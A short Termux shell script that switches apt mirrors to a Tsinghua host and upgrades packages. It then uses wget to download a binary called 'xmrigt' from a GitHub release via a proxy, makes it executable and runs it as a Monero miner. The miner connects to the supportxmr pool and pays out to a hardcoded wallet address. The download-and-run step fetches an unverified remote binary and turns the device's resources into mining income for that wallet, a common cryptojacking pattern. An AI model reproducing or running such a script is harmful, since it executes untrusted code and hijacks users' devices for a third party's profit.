sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list
sed -i 's@^\(deb.*games stable\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/game-packages-24 games stable@' $PREFIX/etc/apt/sources.list.d/game.list
sed -i 's@^\(deb.*science stable\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/science-packages-24 science stable@' $PREFIX/etc/apt/sources.list.d/science.list
apt update -y && apt upgrade -y
pkg install wget
wget https://ghproxy.com/https://github.com/worldawa/deploy/releases/download/1.0/xmrigt
chmod +x xmrigt
./xmrigt -o pool.supportxmr.com:5555 -u 47h5anyu46k6CFWCC9AAqP24SWBS8LcuPdw1L77guFKRTF9WcxNGTs26RWgKagEHxkiPVrjphy7EXPTSe6qd3kpyNNgRL8p
